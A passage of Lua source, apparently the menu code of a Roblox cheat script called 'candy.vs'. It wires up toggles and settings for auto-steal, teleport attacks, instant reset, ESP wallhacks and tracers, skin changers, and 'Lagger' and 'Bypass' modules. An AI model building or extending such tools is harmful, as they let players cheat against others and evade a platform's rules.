	label.Parent = tpBatConfigPanel
	return label
	end
	tpBatConfigText("DISTANCIA TP (STUDS)", 2)
	tpBatConfigText("VERSION TP BAT", 40)

	local tpBatDistanceBox = keepOriginalText(Instance.new("TextBox"))
	tpBatDistanceBox.Size = UDim2.new(0, 72, 0, 26)
	tpBatDistanceBox.Position = UDim2.new(1, -82, 0, 6)
	tpBatDistanceBox.BackgroundColor3 = C.row
	tpBatDistanceBox.BorderSizePixel = 0
	tpBatDistanceBox.ClearTextOnFocus = false
	tpBatDistanceBox.Text = tostring(_G.__tpBatV2Distance or 8)
	tpBatDistanceBox.TextColor3 = C.text
	tpBatDistanceBox.TextSize = 10
	tpBatDistanceBox.Font = Enum.Font.FredokaOne
	tpBatDistanceBox.TextXAlignment = Enum.TextXAlignment.Center
	tpBatDistanceBox.ZIndex = 10
	tpBatDistanceBox.Parent = tpBatConfigPanel
	corner(tpBatDistanceBox, 5); stroke(tpBatDistanceBox, Color3.fromRGB(70, 85, 105), 1)

	local tpBatVersionBox = keepOriginalText(Instance.new("TextButton"))
	tpBatVersionBox.Size = UDim2.new(0, 72, 0, 26)
	tpBatVersionBox.Position = UDim2.new(1, -82, 0, 44)
	tpBatVersionBox.BackgroundColor3 = C.accentDim
	tpBatVersionBox.BorderSizePixel = 0
	tpBatVersionBox.TextColor3 = C.text
	tpBatVersionBox.TextSize = 10
	tpBatVersionBox.Font = Enum.Font.FredokaOne
	tpBatVersionBox.ZIndex = 10
	tpBatVersionBox.Parent = tpBatConfigPanel
	tpBatVersionBox.Visible = true
	corner(tpBatVersionBox, 5); stroke(tpBatVersionBox, Color3.fromRGB(70, 85, 105), 1)

	local function refreshVisibleTPBatConfig()
	_G.__batVersion = tonumber(_G.__batVersion) == 2 and 2 or 1
	tpBatVersionBox.Text = "V" .. tostring(_G.__batVersion or 1)
	tpBatVersionBox.BackgroundColor3 = C.accentDim
	tpBatDistanceBox.TextEditable = true
	tpBatDistanceBox.Text = tostring(_G.__tpBatV2Distance or 8)
	tpBatDistanceBox.BackgroundTransparency = 0
	tpBatDistanceBox.TextColor3 = C.text
	end
	_G.__CandyVSRefreshVisibleTPBatConfig = refreshVisibleTPBatConfig
	refreshVisibleTPBatConfig()

	local tpBatConfigOpen = false
	local function setVisibleTPBatConfig(open)
	tpBatConfigOpen = open == true
	tpBatConfigPanel.Visible = tpBatConfigOpen
	tpBatUiRow.Size = UDim2.new(1, 0, 0, tpBatConfigOpen and (isMobile and 124 or 140) or MODERN.toggleH)
	tpBatConfigToggle.BackgroundColor3 = tpBatConfigOpen and C.accent or C.accentDim
	tpBatConfigTrack.BackgroundColor3 = tpBatConfigOpen and C.accent or Color3.fromRGB(30, 31, 35)
	tpBatConfigKnob.BackgroundColor3 = tpBatConfigOpen and Color3.fromRGB(245, 248, 255) or Color3.fromRGB(155, 165, 180)
	tpBatConfigKnob.Position = tpBatConfigOpen and UDim2.new(1, -10, 0.5, -4) or UDim2.new(0, 2, 0.5, -4)
	end
	tpBatConfigToggle.MouseButton1Click:Connect(function()
	setVisibleTPBatConfig(not tpBatConfigOpen)
	end)

	tpBatDistanceBox.FocusLost:Connect(function()
	_G.CandyVSAutoBat.SetV2Distance(tpBatDistanceBox.Text)
	end)
	tpBatVersionBox.MouseButton1Click:Connect(function()
	_G.CandyVSAutoBat.SetVersion(_G.__batVersion == 1 and 2 or 1)
	refreshVisibleTPBatConfig()
	end)
	sectionLabel(combat, "ACTIONS", 11)
	do
	actionRow(combat, "Drop Brainrot", "Drop", 12, function()
	if FeatureToggles.Drop then pcall(FeatureToggles.Drop, "button") end
	end)

	end
	actionRow(combat, "TP Down", "TP Down", 13, function() if FeatureToggles["TP Down"] then pcall(FeatureToggles["TP Down"]) end end)
	actionRow(combat, "Insta Reset", "Insta Reset", 14, function() if FeatureToggles["Insta Reset"] then pcall(FeatureToggles["Insta Reset"]) end end)
	sectionLabel(combat, "AUTO STEAL", 15)
	local _, autoGrabUiRow = toggleRow(combat, "Auto Steal", "auto steal", toggleStates["auto steal"], 16, false, function(on) setFeature("auto steal", on) end)
	modeButton(autoGrabUiRow, string.upper(autoStealMode), function()
	autoStealMode = (autoStealMode == "v2") and "v1" or "v2"
	if toggleStates["auto steal"] and FeaturePostToggle["auto steal"] then
	pcall(FeaturePostToggle["auto steal"], false)
	pcall(FeaturePostToggle["auto steal"], true)
	end
	saveConfig()
	return string.upper(autoStealMode)
	end)
	local _, autoStealLockToggleRow = toggleRow(combat, "Auto Steal Lock", "Auto Steal Lock", toggleStates["Auto Steal Lock"], 17, false, function(on)
	setFeature("Auto Steal Lock", on)
	end)
	local autoStealRadiusRow = inputRow(combat, "Steal Radius", autoStealValues.Radius, 18, function(value) autoStealValues.Radius = math.clamp(math.floor(value), 10, 150); saveConfig() end)
	local autoStealLockOverlay = {}
	local function addAutoStealLockOverlay(row, text)
		local overlay = Instance.new("TextButton")
		overlay.Name = "AutoStealLockOverlay"
		overlay.Size = UDim2.new(1, 0, 1, 0)
		overlay.Position = UDim2.new(0, 0, 0, 0)
		overlay.BackgroundTransparency = 1
		overlay.BorderSizePixel = 0
		overlay.Text = text
		overlay.TextTransparency = 1
		overlay.TextSize = isMobile and 8 or 9
		overlay.Font = Enum.Font.FredokaOne
		overlay.AutoButtonColor = false
		overlay.Visible = false
		overlay.ZIndex = 20
		overlay.Parent = row
		return overlay
	end
	autoStealLockOverlay.mode = addAutoStealLockOverlay(autoGrabUiRow, "")
	autoStealLockOverlay.radius = addAutoStealLockOverlay(autoStealRadiusRow, "")
	local previousAutoStealLockUpdater = toggleVisualUpdaters["Auto Steal Lock"]
	toggleVisualUpdaters["Auto Steal Lock"] = function()
		if previousAutoStealLockUpdater then pcall(previousAutoStealLockUpdater) end
		local locked = toggleStates["Auto Steal Lock"] == true
		for _, overlay in pairs(autoStealLockOverlay) do
			overlay.Visible = locked
		end
		pcall(function()
			if _G.__CandyVSSetAutoStealUILocked then _G.__CandyVSSetAutoStealUILocked(locked) end
		end)
	end
	toggleVisualUpdaters["Auto Steal Lock"]()

	local visual = pages.Visual
	sectionLabel(visual, "VISUAL", -2)
	local _, backgroundUiRow = toggleRow(visual, "Background", nil, true, -1, false, function() end)
	modeButton(backgroundUiRow, activeGuiTheme == "GUI 2" and "2" or "1", function()
		activeGuiTheme = activeGuiTheme == "GUI 1" and "GUI 2" or "GUI 1"
		applyGuiTheme(activeGuiTheme)
		pcall(saveConfig)
		return activeGuiTheme == "GUI 2" and "2" or "1"
	end)
	toggleRow(visual, "anti lag", "Anti Lag", toggleStates["Anti Lag"], -1, false, function(on) setFeature("Anti Lag", on) end)
	toggleRow(visual, "ESP Players", "ESP Players", toggleStates["ESP Players"], 1, false, function(on)
	setFeature("ESP Players", on)
	end)
	toggleRow(visual, "ESP Line", "Player Tracers", toggleStates["Player Tracers"], 2, false, function(on)
	setFeature("Player Tracers", on)
	end)
	local _, optimizerUiRow = toggleRow(visual, "Optimizer", "Optimizer", toggleStates.Optimizer, 3, false, function(on)
	setFeature("Optimizer", on)
	end)
	local optimizerUiModeButton = modeButton(optimizerUiRow, string.upper(optimizerMode or "Ultra"), function()
	local mode = optimizerMode == "Ultra" and "Normal" or "Ultra"
	setOptimizerMode(mode)
	return string.upper(mode)
	end)
	table.insert(optimizerModeRefreshers, function(mode)
	if optimizerUiModeButton and optimizerUiModeButton.Parent then
	optimizerUiModeButton.Text = string.upper(mode)
	end
	end)
	toggleRow(visual, "Stretch Rez", "Stretchz Res", toggleStates["Stretchz Res"], 4, false, function(on) setFeature("Stretchz Res", on) end)
	sectionLabel(visual, "FOV", 5)
	toggleRow(visual, "Custom FOV", "Custom FOV", toggleStates["Custom FOV"], 6, false, function(on)
	setFeature("Custom FOV", on)
	end)
	inputRow(visual, "FOV", speedValues.FOV, 7, function(value)
	speedValues.FOV = math.clamp(math.floor(value), 30, 120)
	setFeature("Custom FOV", true)
	if FeaturePostToggle["Custom FOV"] then pcall(FeaturePostToggle["Custom FOV"], true) end
	local camera = workspace.CurrentCamera; if camera then camera.FieldOfView = speedValues.FOV end
	saveConfig()
	end)
	sectionLabel(visual, "SKY", 8)
	local _, skyThemesUiRow = toggleRow(visual, "Sky Themes", "Sky Changer", toggleStates["Sky Changer"], 9, false, function(on)
	setFeature("Sky Changer", on)
	end)
	modeButton(skyThemesUiRow, string.upper(skyCurrentMode or "blue"), function()
	if skyCurrentMode == "day" then
	skyCurrentMode = "blue"
	elseif skyCurrentMode == "blue" then
	skyCurrentMode = "night"
	else
	skyCurrentMode = "day"
	end
	_G.__CandyVSSkyChangerMode = skyCurrentMode
	if toggleStates["Sky Changer"] then applySky(skyCurrentMode) end
	saveConfig()
	return string.upper(skyCurrentMode)
	end)
	sectionLabel(visual, "SKIN CHANGER", 10)
	do
	local skinUi = {}
	skinUi.update, skinUi.row = toggleRow(visual, "Skin Changer", "Skin Changer", toggleStates["Skin Changer"], 11, false, function(on)
		setFeature("Skin Changer", on)
	end)
	skinUi.button = modeButton(skinUi.row, skinChangerMode, function()
		skinChangerMode = skinChangerMode == "V1" and "V2" or (skinChangerMode == "V2" and "V3" or "V1")
		saveConfig()
		if toggleStates["Skin Changer"] then FeaturePostToggle["Skin Changer"](true) end
		return skinChangerMode
	end)
	skinUi.refresh = function()
		skinUi.update(toggleStates["Skin Changer"] == true)
		skinUi.button.Text = skinChangerMode
	end
	toggleVisualUpdaters["Skin Changer"] = skinUi.refresh
	skinUi.refresh()
	end
	do
	local appearanceUi = {}
	appearanceUi.add = function(label, featureName, order)
		local ref = {}
		ref.update, ref.row = toggleRow(visual, label, featureName, toggleStates[featureName], order, false, function(on)
			setFeature(featureName, on)
		end)
		ref.button = modeButton(ref.row, toggleStates[featureName] and "ON" or "OFF", function()
			setFeature(featureName, not toggleStates[featureName])
			return toggleStates[featureName] and "ON" or "OFF"
		end)
		ref.refresh = function()
			ref.update(toggleStates[featureName] == true)
			ref.button.Text = toggleStates[featureName] and "ON" or "OFF"
		end
		toggleVisualUpdaters[featureName] = ref.refresh
		ref.refresh()
	end
	appearanceUi.add("Headless", "Headless Visual", 12)
	appearanceUi.add("Korblox", "Korblox Visual", 13)
	end
	sectionLabel(visual, "GUI", 14)
	toggleRow(visual, "Quick Buttons", "Show Buttons", toggleStates["Show Buttons"], 16, false, function(on)
	setFeature("Show Buttons", on)
	end)
	do
	local sizeRow = actionRow(visual, "Buttons Size", nil, 16.5, function() end)
	local sizeBox = keepOriginalText(Instance.new("TextBox"))
	sizeBox.Name = "ButtonsSizeInput"
	sizeBox.Size = UDim2.fromOffset(64, isMobile and 22 or 26)
	sizeBox.AnchorPoint = Vector2.new(1, 0.5)
	sizeBox.Position = UDim2.new(1, -10, 0.5, 0)
	sizeBox.BackgroundColor3 = C.accentDim
	sizeBox.BorderSizePixel = 0
	sizeBox.TextColor3 = C.text
	sizeBox.Font = Enum.Font.FredokaOne
	sizeBox.TextSize = 12
	sizeBox.Text = tostring(_G.__CandyVSButtonsSize or 1)
	sizeBox.PlaceholderText = "0.5 - 2"
	sizeBox.ClearTextOnFocus = false
	sizeBox.ZIndex = 8
	sizeBox.Parent = sizeRow
	corner(sizeBox, 5)
	sizeBox.FocusLost:Connect(function()
		sizeBox.Text = tostring(_G.__CandyVSSetButtonsSize(sizeBox.Text))
	end)
	end
	do
	local scaleRow = actionRow(visual, "UI Scale", nil, 16.6, function() end)
	local scaleBox = keepOriginalText(Instance.new("TextBox"))
	scaleBox.Name = "UIScaleInput"
	scaleBox.Size = UDim2.fromOffset(64, isMobile and 22 or 26)
	scaleBox.AnchorPoint = Vector2.new(1, 0.5)
	scaleBox.Position = UDim2.new(1, -10, 0.5, 0)
	scaleBox.BackgroundColor3 = C.accentDim
	scaleBox.BorderSizePixel = 0
	scaleBox.TextColor3 = C.text
	scaleBox.Font = Enum.Font.FredokaOne
	scaleBox.TextSize = 12
	scaleBox.Text = tostring(_G.__CandyVSUIScale or 78)
	scaleBox.PlaceholderText = "40 - 150"
	scaleBox.ClearTextOnFocus = false
	scaleBox.ZIndex = 8
	scaleBox.Parent = scaleRow
	corner(scaleBox, 5)
	scaleBox.FocusLost:Connect(function()
		if _G.__CandyVSSetUIScale then
			scaleBox.Text = tostring(_G.__CandyVSSetUIScale(scaleBox.Text))
		end
	end)
	end
	actionRow(visual, "reset butons pos.", nil, 17, function()
	_G.__CandyVSResetButtonPositions()
	if _G.CandyVSLagger and _G.CandyVSLagger.ResetPosition then _G.CandyVSLagger.ResetPosition() end
	if _G.CandyVSBypass and _G.CandyVSBypass.ResetPosition then _G.CandyVSBypass.ResetPosition() end
	end)
	toggleRow(visual, "Lock Buttons", "Lock Buttons", toggleStates["Lock Buttons"], 18, false, function(on)
	setFeature("Lock Buttons", on)
	end)
	actionRow(visual, "Hide GUI Key", "Toggle UI", 19, function() Panel.Visible = false end)

	local animations = pages.Animations
	sectionLabel(animations, "ANIMATION SOURCE", 0)
	local selectedSourcePreset = _G.__CandyVSAnimationPreset
	if not selectedSourcePreset or not animationPresets[selectedSourcePreset] then
	selectedSourcePreset = selectedAnimationPresetName or animationPresetOrder[1]
	end
	local presetList = Instance.new("ScrollingFrame")
	presetList.Name = "AnimationPresetList"
	presetList.Size = UDim2.new(1, 0, 0, isMobile and 180 or 220)
	presetList.BackgroundColor3 = C.bgDark
	presetList.BackgroundTransparency = 0.15
	presetList.BorderSizePixel = 0
	presetList.ScrollBarThickness = 3
	presetList.ScrollBarImageColor3 = C.accent
	presetList.CanvasSize = UDim2.new(0, 0, 0, 0)
	presetList.AutomaticCanvasSize = Enum.AutomaticSize.Y
	presetList.LayoutOrder = 1
	presetList.ZIndex = 6
	presetList.Parent = animations
	corner(presetList, 12)
	stroke(presetList, C.divider, 1)
	local presetListLayout = Instance.new("UIListLayout", presetList)
	presetListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	presetListLayout.Padding = UDim.new(0, 4)
	local presetListPad = Instance.new("UIPadding", presetList)
	presetListPad.PaddingTop = UDim.new(0, 6)
	presetListPad.PaddingBottom = UDim.new(0, 6)
	presetListPad.PaddingLeft = UDim.new(0, 6)
	presetListPad.PaddingRight = UDim.new(0, 6)
	local presetButtons = {}
	local function refreshAnimationPresetButton()
	for name, btn in pairs(presetButtons) do
		local selected = name == selectedSourcePreset
		btn.BackgroundColor3 = selected and C.accent or C.bgDark
		btn.BackgroundTransparency = selected and 0.15 or 0.35
		btn.TextColor3 = selected and Color3.fromRGB(255, 255, 255) or C.text
		local st = btn:FindFirstChildOfClass("UIStroke")
		if st then
			st.Color = selected and C.accent or C.divider
			st.Transparency = selected and 0.25 or 0.6
		end
	end
	end
	local function selectSourcePreset(name)
	if not name or not animationPresets[name] then return end
	selectedSourcePreset = name
	refreshAnimationPresetButton()
	_G.__CandyVSAnimationPreset = selectedSourcePreset
	if toggleStates["Animaciones"] then
		FeaturePostToggle["Animaciones"](true)
	else
		setFeature("Animaciones", true)
	end
	pcall(saveConfig)
	end
	for index, name in ipairs(animationPresetOrder) do
		local btn = keepOriginalText(Instance.new("TextButton"))
		btn.Name = "Preset_" .. name:gsub("%s+", "")
		btn.Size = UDim2.new(1, 0, 0, isMobile and 30 or 34)
		btn.BackgroundColor3 = C.bgDark
		btn.BackgroundTransparency = 0.35
		btn.BorderSizePixel = 0
		btn.Text = "  " .. name
		btn.TextColor3 = C.text
		btn.TextSize = isMobile and 11 or 12
		btn.Font = Enum.Font.FredokaOne
		btn.TextXAlignment = Enum.TextXAlignment.Left
		btn.LayoutOrder = index
		btn.AutoButtonColor = false
		btn.ZIndex = 7
		btn.Parent = presetList
		corner(btn, 10)
		stroke(btn, C.divider, 1)
		presetButtons[name] = btn
		btn.MouseButton1Click:Connect(function()
			selectSourcePreset(name)
		end)
	end
	refreshAnimationPresetButton()
	local function sourceAssetId(value)
	if type(value) == "number" then return "rbxassetid://" .. tostring(value) end
	if type(value) == "string" and string.match(value, "^%d+$") then return "rbxassetid://" .. value end
	return value
	end
	local sourceAnimationOriginals = _G.__CandyVSOriginalAnimations
	if type(sourceAnimationOriginals) ~= "table" then
	sourceAnimationOriginals = setmetatable({}, {__mode = "k"})
	_G.__CandyVSOriginalAnimations = sourceAnimationOriginals
	end
	local function captureSourceAnimationOriginals(character, targets, saved)
	saved = saved or {}
	if next(saved) == nil then
		for name, target in pairs(targets) do
			if target then saved[name] = target.AnimationId end
		end
	end

	local humanoid = character:FindFirstChildOfClass("Humanoid")
	local ok, description = pcall(function()
		return humanoid and humanoid:GetAppliedDescription()
	end)
	if ok and description then
		local function useDescription(name, property)
			local value = tonumber(description[property])
			if value and value > 0 and targets[name] then
				saved[name] = "rbxassetid://" .. tostring(value)
			end
		end
		useDescription("idle1", "IdleAnimation")
		useDescription("idle2", "IdleAnimation")
		useDescription("walk", "WalkAnimation")
		useDescription("run", "RunAnimation")
		useDescription("jump", "JumpAnimation")
		useDescription("fall", "FallAnimation")
		useDescription("climb", "ClimbAnimation")
		useDescription("swim", "SwimAnimation")
		useDescription("swimidle", "SwimAnimation")
	end
	return saved
	end
	local function applySourcePreset(presetName, restoreOriginal)
	local character = Player.Character
	local animate = character and (character:FindFirstChild("Animate") or character:WaitForChild("Animate", 3))
	if not animate then return false end
	local targets = {
		idle1 = animate:FindFirstChild("idle") and animate.idle:FindFirstChild("Animation1"),
		idle2 = animate:FindFirstChild("idle") and animate.idle:FindFirstChild("Animation2"),
		walk = animate:FindFirstChild("walk") and animate.walk:FindFirstChild("WalkAnim"),
		run = animate:FindFirstChild("run") and animate.run:FindFirstChild("RunAnim"),
		jump = animate:FindFirstChild("jump") and animate.jump:FindFirstChild("JumpAnim"),
		fall = animate:FindFirstChild("fall") and animate.fall:FindFirstChild("FallAnim"),
		climb = animate:FindFirstChild("climb") and animate.climb:FindFirstChild("ClimbAnim"),
		swim = animate:FindFirstChild("swim") and animate.swim:FindFirstChild("Swim"),
		swimidle = animate:FindFirstChild("swimidle") and animate.swimidle:FindFirstChild("SwimIdle"),
	}
	if restoreOriginal then
		local saved = sourceAnimationOriginals[character]
		if not saved then return false end
		for name, value in pairs(saved) do
			if targets[name] then targets[name].AnimationId = value end
		end
	else
		local preset = animationPresets[presetName]
		if not preset then return false end
		sourceAnimationOriginals[character] = captureSourceAnimationOriginals(
			character,
			targets,
			sourceAnimationOriginals[character]
		)
		local idle = preset.Idle or {}
		local values = {
			idle1 = preset.Animation1 or idle[1], idle2 = preset.Animation2 or idle[2],
			walk = preset.WalkAnim, run = preset.RunAnim, jump = preset.JumpAnim,
			fall = preset.FallAnim, climb = preset.ClimbAnim, swim = preset.Swim, swimidle = preset.SwimIdle,
		}
		for name, value in pairs(values) do
			if targets[name] and value then targets[name].AnimationId = sourceAssetId(value) end
		end
	end
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if humanoid then
		for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do pcall(function() track:Stop(0) end) end
	end
	return true
	end
	FeaturePostToggle["Animaciones"] = function(active)
	toggleStates["Harder Hit Anim"] = false
	if active then
		_G.__CandyVSAnimationPreset = selectedSourcePreset
		pcall(applySourcePreset, selectedSourcePreset, false)
	else
		pcall(applySourcePreset, nil, true)
	end
	if toggleVisualUpdaters["Harder Hit Anim"] then pcall(toggleVisualUpdaters["Harder Hit Anim"]) end
	end
	local animationToggleUpdater, animationToggleRow = toggleRow(
	animations,
	"Animaciones",
	"Animaciones",
	toggleStates["Animaciones"],
	2,
	false,
	function(on) setFeature("Animaciones", on) end
	)
	animationToggleRow.Name = "AnimationsMasterToggle"
	animationToggleRow.Visible = true
	animationToggleRow.ZIndex = 8
	local animationStateButton = modeButton(
	animationToggleRow,
	toggleStates["Animaciones"] and "ON" or "OFF",
	function()
	setFeature("Animaciones", not toggleStates["Animaciones"])
	return toggleStates["Animaciones"] and "ON" or "OFF"
	end
	)
	local function refreshAnimationToggle()
	animationToggleUpdater(toggleStates["Animaciones"] == true)
	animationStateButton.Text = toggleStates["Animaciones"] and "ON" or "OFF"
	end
	toggleVisualUpdaters["Animaciones"] = refreshAnimationToggle
	refreshAnimationToggle()
	_G.__CandyVSTrackConn(Player.CharacterAdded:Connect(function()
	if not toggleStates["Animaciones"] or not _G.__CandyVSAnimationPreset then return end
	task.wait(0.75)
	pcall(applySourcePreset, _G.__CandyVSAnimationPreset, false)
	end))
	if toggleStates["Animaciones"] and _G.__CandyVSAnimationPreset then
	task.defer(function()
	task.wait(0.5)
	pcall(applySourcePreset, _G.__CandyVSAnimationPreset, false)
	end)
	end
	local animationInfo = keepOriginalText(Instance.new("TextLabel"))
	animationInfo.Size = UDim2.new(1, -8, 0, 30)
	animationInfo.BackgroundTransparency = 1
	animationInfo.LayoutOrder = 4
	animationInfo.Text = "Tap a preset in the list to apply and save. Use the toggle to enable or disable."
	animationInfo.TextColor3 = C.textDim
	animationInfo.TextSize = 10
	animationInfo.Font = Enum.Font.FredokaOne
	animationInfo.TextWrapped = true
	animationInfo.TextXAlignment = Enum.TextXAlignment.Left
	animationInfo.Parent = animations

	local activeCategory = "Movement"
	for order, name in ipairs({"Movement", "Combat", "Visual", "Animations"}) do
	local button = keepOriginalText(Instance.new("TextButton"))
	button.Name = name .. "Button"
	button.Size = UDim2.new(0, isMobile and 60 or 64, 0, isMobile and 28 or 30)
	button.BackgroundColor3 = name == activeCategory and C.accent or Color3.fromRGB(14, 7, 3)
	button.BackgroundTransparency = name == activeCategory and 0.12 or 0.2
	button.BorderSizePixel = 0
	button.Text = string.upper(name)
	button.TextColor3 = name == activeCategory and Color3.fromRGB(255, 255, 255) or C.textMuted
	button.TextSize = isMobile and 10 or 11
	button.Font = Enum.Font.FredokaOne
	button.LayoutOrder = order
	button.AutoButtonColor = false
	button.Parent = categoryList
	corner(button, 10)
	local catStroke = stroke(button, name == activeCategory and Color3.fromRGB(255, 190, 80) or C.divider, 1.4)
	catStroke.Transparency = name == activeCategory and 0.1 or 0.5
	local indicator = Instance.new("Frame")
	indicator.Name = "Indicator"
	indicator.Size = UDim2.new(0, 0, 0, 0)
	indicator.BackgroundTransparency = 1
	indicator.Visible = false
	indicator.Parent = button
	button.MouseButton1Click:Connect(function()
	if activeCategory == name then return end
	activeCategory = name
	for pageName, page in pairs(pages) do
	local selectedPage = pageName == name
	page.Visible = selectedPage
	if selectedPage then
	local pageScale = pageScales[pageName]
	if pageScale then
	pageScale.Scale = 0.975
	tween(pageScale, {Scale = 1}, 0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
	end
	end
	end
	for _, other in ipairs(categoryList:GetChildren()) do
	if other:IsA("TextButton") then
	local selected = other.Name == name .. "Button"
	tween(other, {
	TextColor3 = selected and Color3.fromRGB(255, 255, 255) or C.textMuted,
	BackgroundColor3 = selected and C.accent or Color3.fromRGB(14, 7, 3),
	BackgroundTransparency = selected and 0.12 or 0.2,
	}, 0.18)
	local st = other:FindFirstChildOfClass("UIStroke")
	if st then
	st.Color = selected and Color3.fromRGB(255, 190, 80) or C.divider
	st.Transparency = selected and 0.1 or 0.5
	end
	end
	end
	end)
	button.MouseEnter:Connect(function()
	if activeCategory ~= name then tween(button, {TextColor3 = C.text, BackgroundTransparency = 0.25}) end
	end)
	button.MouseLeave:Connect(function()
	if activeCategory ~= name then tween(button, {TextColor3 = C.text, BackgroundTransparency = 0.3}) end
	end)
	end
	refreshCategoryTextColors = function()
	for _, categoryButton in ipairs(categoryList:GetChildren()) do
	if categoryButton:IsA("TextButton") then
		local selected = categoryButton.Name == (activeCategory .. "Button")
		categoryButton.TextColor3 = selected and Color3.fromRGB(255, 255, 255) or C.textMuted
		categoryButton.BackgroundColor3 = selected and C.accent or Color3.fromRGB(14, 7, 3)
		categoryButton.BackgroundTransparency = selected and 0.12 or 0.2
		local st = categoryButton:FindFirstChildOfClass("UIStroke")
		if st then
			st.Color = selected and Color3.fromRGB(255, 190, 80) or C.divider
			st.Transparency = selected and 0.1 or 0.5
		end
	end
	end
	end
	refreshCategoryTextColors()

	local miniButton = Instance.new("TextButton")
	keepOriginalText(miniButton)
	miniButton.Name = "CandyVSRestoreButton"
	miniButton.Size = UDim2.new(0, 120, 0, 30)
	local savedMiniPos = _G["_CandyVS_UI_ModernMiniPos"]
	miniButton.Position = savedMiniPos and UDim2.fromOffset(savedMiniPos.x or 6, savedMiniPos.y or 54) or UDim2.new(0, 6, 0, 54)
	miniButton.BackgroundColor3 = C.bgDark
	miniButton.BorderSizePixel = 0
	miniButton.Text = "candy.vs"
	miniButton.TextColor3 = C.text
	miniButton.TextSize = 11
	miniButton.Font = Enum.Font.FredokaOne
	miniButton.Visible = not Panel.Visible
	miniButton.ZIndex = 900
	miniButton.Parent = ScreenGui
	corner(miniButton, 14)
	stroke(miniButton, C.accentDim, 1.2)
	makeDraggable(miniButton, miniButton)

	closeButton.MouseButton1Click:Connect(function()
	if _G.__setPanelVisible then _G.__setPanelVisible(false) else Panel.Visible = false end
	end)
	miniButton.MouseButton1Click:Connect(function()
	if _G.__setPanelVisible then _G.__setPanelVisible(true) else Panel.Visible = true end
	end)
	Panel:GetPropertyChangedSignal("Visible"):Connect(function()
	_G.__CandyVSPanelVisible = Panel.Visible
	toggleStates["Toggle UI"] = Panel.Visible
	miniButton.Visible = not Panel.Visible
	saveConfig()
	end)

	local function keepNewPanelSize()
	local camera = workspace.CurrentCamera
	if not camera then return end
	local viewport = camera.ViewportSize
	if viewport.X <= 0 or viewport.Y <= 0 then return end
	local availableW = math.max(1, viewport.X - 12)
	local availableH = math.max(1, viewport.Y - 60)
	if isMobile then
		Panel.Size = UDim2.new(0, math.min(availableW, math.clamp(math.floor(viewport.X * 0.52), 210, 270)), 0, math.min(availableH, math.clamp(math.floor(viewport.Y * 0.72), 420, 560)))
	else
		Panel.Size = UDim2.new(0, math.min(280, availableW), 0, math.min(580, availableH))
	end
	if _G.__CandyVSMainUIScale and _G.__CandyVSMainUIScale.Parent then
		_G.__CandyVSMainUIScale.Scale = math.clamp((_G.__CandyVSUIScale or 78) / 100, 0.4, 1.5)
	end
	for _, target in ipairs({Panel, miniButton}) do
	local position = target.Position
	placeInsideViewport(target, position.X.Scale, position.X.Offset, position.Y.Scale, position.Y.Offset)
	end
	end
	keepNewPanelSize()
	local viewportConnection
	local function watchModernCamera()
	if viewportConnection then viewportConnection:Disconnect(); viewportConnection = nil end
	local camera = workspace.CurrentCamera
	if camera then
	viewportConnection = _G.__CandyVSTrackConn(camera:GetPropertyChangedSignal("ViewportSize"):Connect(function()
	task.defer(keepNewPanelSize)
	end))
	end
	task.defer(keepNewPanelSize)
	end
	_G.__CandyVSTrackConn(workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(watchModernCamera))
	watchModernCamera()
	end)()
	_G.__CandyVSRegisterThemeRoot(ScreenGui)


	task.spawn(function()
	local blackout = Instance.new("Frame")
	blackout.Size = UDim2.new(1, 0, 1, 0)
	blackout.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	blackout.BackgroundTransparency = 1
	blackout.BorderSizePixel = 0
	blackout.ZIndex = 10000
	blackout.Parent = ScreenGui
	TweenService:Create(blackout, TweenInfo.new(0.08, Enum.EasingStyle.Quad), {BackgroundTransparency = 0.45}):Play()
	task.wait(0.12)
	TweenService:Create(blackout, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
	task.wait(0.3)
	pcall(function() blackout:Destroy() end)
	end)

	;(function()
	local function keyDisplayName(kc)
	if not kc then return "..." end
	return keybindDisplayName(kc)
	end

	local function handleKeyInput(input, gameProcessed)
	if listeningBindBtn and listeningFeature then
	local updatedFeature = listeningFeature
	local isTouchOrClick = (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1)
	if isBindableInput(input) or isTouchOrClick or isMouseSideButton(input) then
	if isTouchOrClick or input.KeyCode == Enum.KeyCode.Escape or (isClearKeybindInput(input) and updatedFeature ~= "Toggle UI") then
	FeatureKeybinds[updatedFeature] = nil
	local emptyText = (listeningBindBtn.Size.X.Offset == 42 or listeningBindBtn:GetAttribute("MiniUIBind")) and "-" or "BIND"
	listeningBindBtn.Text = emptyText
	elseif isMouseSideButton(input) then
	local mbName = getMouseButtonBind(input)
	FeatureKeybinds[updatedFeature] = mbName
	listeningBindBtn.Text = mouseButtonDisplay[mbName] or mbName
	else
	FeatureKeybinds[updatedFeature] = input.KeyCode
	listeningBindBtn.Text = keyDisplayName(input.KeyCode)
	end
	listeningBindBtn.BackgroundColor3 = Color3.fromRGB(210,230,250)
	listeningBindBtn.TextColor3 = Color3.fromRGB(80,130,200)
	listeningBindBtn = nil
	listeningFeature = nil
	saveConfig()
	if updatedFeature and toggleVisualUpdaters[updatedFeature] then toggleVisualUpdaters[updatedFeature]() end
	local mapped = _featureToggleMap[updatedFeature]
	if mapped and mapped.bindCircle then
	local k = FeatureKeybinds[updatedFeature]
	mapped.bindCircle.Text = k and keyDisplayName(k) or "-"
	end
	return
	end
	end

	if UserInputService:GetFocusedTextBox() then return end
	local carryKey = FeatureKeybinds["Carry Speed"]
	local carryKeyMatches = carryKey ~= nil and (
		(isBindableInput(input) and input.KeyCode == carryKey)
		or (isMouseSideButton(input) and getMouseButtonBind(input) == carryKey)
	)
	local normalModeKey = FeatureKeybinds["SelectNormalMode"]
	local normalModeKeyMatches = normalModeKey ~= nil and (
		(isBindableInput(input) and input.KeyCode == normalModeKey)
		or (isMouseSideButton(input) and getMouseButtonBind(input) == normalModeKey)
	)
	if normalModeKeyMatches and selectedMode ~= "Normal" then
		if FeatureToggles["SelectNormalMode"] then
			FeatureToggles["SelectNormalMode"]()
		end
		pcall(function() if _G.__refreshSpeedBoost then _G.__refreshSpeedBoost() end end)
